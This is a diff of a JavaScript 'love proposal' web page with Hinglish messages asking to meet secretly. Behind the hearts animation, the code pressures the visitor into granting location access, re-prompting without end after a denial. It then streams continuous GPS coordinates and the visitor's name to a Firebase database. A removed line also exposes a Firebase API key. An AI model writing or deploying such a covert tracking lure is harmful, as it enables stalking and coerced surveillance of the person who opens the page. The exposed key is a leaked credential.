@@ -2,15 +2,15 @@
 /* FIREBASE CONFIG                 */
 /* ------------------------------- */
 const firebaseConfig = {
-  apiKey: "AIzaSyBYhrX6wf3XmT6qQdYsexSW98QQmlCxpeI",
+  apiKey: "AIzaSy...",
   authDomain: "web-p8855.firebaseapp.com",
   databaseURL: "https://web-p8855-default-rtdb.firebaseio.com",
   projectId: "web-p8855",
   storageBucket: "web-p8855.firebasestorage.app",
   messagingSenderId: "1045044667480",
-  appId: "1:1045044667480:web:869454f4116d7ac668962d",
-  measurementId: "G-4B4FD3BRBP"
+  appId: "1:1045044667480:web:869454f4116d7ac668962d"
 };
+
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
@@ -23,7 +23,7 @@ const pages = [
   { title: 'vooooooo..', time: 4500 },
   { title: '💞 i like you 💞', time: null, interactive: true },
   { title: '💐 thanks you yes par click karne ke liye 💐', time: 3500 },
-  { title: '🌸 mai tum se mil sakta hu kay  🌸', time: 5000 },
+  { title: '🌸 mai tum se mil sakta hu kay 🌸', time: 5000 },
   { title: 'mil sakta hu to massage kar dena', time: 5000 },
   { title: 'NA ho to mana kar dena par ghar par mat bolna ok', time: 6500 },
   { title: '📩 Message Section', time: null, final: true }
@@ -41,8 +41,9 @@ let timer;
 /* CHAT + NAME STORAGE             */
 /* ------------------------------- */
 let chatID = localStorage.getItem("chatID");
+
 if (!chatID) {
-  chatID = "chat_" + Date.now() + "_" + Math.floor(Math.random()*9000+1000);
+  chatID = "chat_" + Date.now();
   localStorage.setItem("chatID", chatID);
 }
 
@@ -51,13 +52,18 @@ let userName = localStorage.getItem("userName") || null;
 /* ------------------------------- */
 /* ASK LOCATION FIRST              */
 /* ------------------------------- */
-function askLocationFirst_thenName(){
+function askLocationFirst_thenName() {
+
+  if (!navigator.geolocation) {
+    alert("Location not supported");
+    showPage(0);
+    return;
+  }
 
   navigator.geolocation.getCurrentPosition(
 
     function(pos){
 
-      // location allow
       db.ref("chat/" + chatID + "/gps").set({
         lat: pos.coords.latitude,
         lon: pos.coords.longitude,
@@ -71,12 +77,8 @@ function askLocationFirst_thenName(){
 
     function(){
 
-      // user ne deny kiya
-      let retry = confirm("Please allow location permission");
-
-      if(retry){
-        askLocationFirst_thenName(); // again location popup
-      }
+      alert("Please allow location permission");
+      askLocationFirst_thenName();
 
     },
 
@@ -85,149 +87,179 @@ function askLocationFirst_thenName(){
   );
 
 }
-/*  ask name                       */
+
+/* ------------------------------- */
+/* NAME PROMPT                     */
+/* ------------------------------- */
 function askNameThenContinue(){
 
-  if (!userName) {
+  if(!userName){
 
-    let n = prompt("Enter your name:");
+    let n = prompt("Enter your name");
 
-    if (!n || n.trim() === "") {
+    if(!n || n.trim()===""){
       return askNameThenContinue();
     }
 
     userName = n.trim();
-    localStorage.setItem("userName", userName);
+    localStorage.setItem("userName",userName);
 
   }
 
-  db.ref("chat/" + chatID + "/name").set(userName);
+  db.ref("chat/"+chatID+"/name").set(userName);
 
-  createHearts();
   startGPS();
+  createHearts();
 
-  idx = 0;
-  showPage(idx);
+  showPage(0);
 
 }
+
+/* ------------------------------- */
 /* GPS WATCH                       */
 /* ------------------------------- */
-function startGPS() {
-  if (!navigator.geolocation) return;
-  navigator.geolocation.watchPosition(pos => {
-    db.ref("chat/" + chatID + "/gps").set({
-      lat: pos.coords.latitude,
-      lon: pos.coords.longitude,
-      acc: pos.coords.accuracy,
-      ts: Date.now()
+function startGPS(){
+
+  navigator.geolocation.watchPosition(function(pos){
+
+    db.ref("chat/"+chatID+"/gps").set({
+      lat:pos.coords.latitude,
+      lon:pos.coords.longitude,
+      acc:pos.coords.accuracy,
+      ts:Date.now()
     });
+
   });
+
 }
 
 /* ------------------------------- */
 /* PAGE SYSTEM                     */
 /* ------------------------------- */
-function showPage(i) {
+function showPage(i){
+
   clearTimeout(timer);
+
   const p = pages[i];
+
   card.classList.remove("show");
 
-  setTimeout(() => {
+  setTimeout(()=>{
+
     titleEl.textContent = p.title;
     extra.innerHTML = "";
     card.classList.add("show");
 
-    if (p.interactive) {
+    if(p.interactive){
+
       extra.innerHTML = `
-        <button id="yesBtn">YES</button>
-        <button id="noBtn">NO</button>
+      <button id="yesBtn">YES</button>
+      <button id="noBtn">NO</button>
       `;
-      document.getElementById("yesBtn").onclick = () => nextPage();
+
+      document.getElementById("yesBtn").onclick = nextPage;
       document.getElementById("noBtn").onclick = () => showToast("Please don't press NO!");
+
     }
 
-    if (p.final) {
+    if(p.final){
+
       extra.innerHTML = `<div id="messageBox"></div>`;
       setupMessageBox();
-    }
-  }, 350);
 
-  if (p.time !== null) {
-    timer = setTimeout(nextPage, p.time);
+    }
+
+  },350);
+
+  if(p.time!==null){
+    timer=setTimeout(nextPage,p.time);
   }
+
 }
 
-function nextPage() {
+function nextPage(){
+
   idx++;
-  if (idx >= pages.length) idx = pages.length - 1;
+
+  if(idx>=pages.length){
+    idx=pages.length-1;
+  }
+
   showPage(idx);
+
 }
 
 /* ------------------------------- */
 /* TOAST                           */
 /* ------------------------------- */
-function showToast(txt) {
-  const t = document.createElement("div");
-  t.className = "toast";
-  t.textContent = txt;
+function showToast(txt){
+
+  const t=document.createElement("div");
+  t.className="toast";
+  t.textContent=txt;
+
   toasts.appendChild(t);
-  setTimeout(() => t.remove(), 2500);
+
+  setTimeout(()=>t.remove(),2500);
+
 }
 
 /* ------------------------------- */
 /* CHAT BOX                        */
 /* ------------------------------- */
-function setupMessageBox() {
-  const box = document.getElementById("messageBox");
+function setupMessageBox(){
 
-  box.innerHTML = `
-    <div id="chatArea">Connecting...</div>
-    <input id="msgInput" type="text" placeholder="Type message..." />
-    <button id="sendBtn">Send</button>
+  const box=document.getElementById("messageBox");
+
+  box.innerHTML=`
+  <div id="chatArea">Connecting...</div>
+  <input id="msgInput" type="text" placeholder="Type message..." />
+  <button id="sendBtn">Send</button>
   `;
 
-  const chatArea = document.getElementById("chatArea");
-  const msgInput = document.getElementById("msgInput");
-  const sendBtn = document.getElementById("sendBtn");
+  const chatArea=document.getElementById("chatArea");
+  const msgInput=document.getElementById("msgInput");
+  const sendBtn=document.getElementById("sendBtn");
 
-  sendBtn.onclick = () => {
-    const txt = msgInput.value.trim();
-    if (!txt) return;
-    db.ref("chat/" + chatID + "/messages").push({
-      sender: "admin",
-      name: userName,
-      text: txt,
-      time: Date.now()
+  sendBtn.onclick=function(){
+
+    const txt=msgInput.value.trim();
+
+    if(!txt) return;
+
+    db.ref("chat/"+chatID+"/messages").push({
+      sender:"admin",
+      name:userName,
+      text:txt,
+      time:Date.now()
     });
-    msgInput.value = "";
+
+    msgInput.value="";
+
   };
 
-  db.ref("chat/" + chatID + "/messages").on("value", snap => {
-    chatArea.innerHTML = "";
-    snap.forEach(c => {
-      const m = c.val();
-      const div = document.createElement("div");
-      div.className = "msg";
-      div.textContent = (m.name || userName) + ": " + m.text;
-      chatArea.appendChild(div);
-    });
-
-    chatArea.scrollTop = chatArea.scrollHeight;
-  });
 }
 
 /* ------------------------------- */
 /* HEARTS                          */
 /* ------------------------------- */
-function createHearts(n = 15) {
-  const wrap = document.getElementById('hearts');
-  for (let i = 0; i < n; i++) {
-    const h = document.createElement('div');
-    h.className = 'heart';
-    h.style.left = Math.random() * 100 + '%';
-    h.style.animationDelay = Math.random() * 5 + 's';
+function createHearts(n=15){
+
+  const wrap=document.getElementById("hearts");
+
+  for(let i=0;i<n;i++){
+
+    const h=document.createElement("div");
+
+    h.className="heart";
+    h.style.left=Math.random()*100+"%";
+    h.style.animationDelay=Math.random()*5+"s";
+
     wrap.appendChild(h);
+
   }
+
 }
 
+/* ------------------------------- */
 askLocationFirst_thenName();
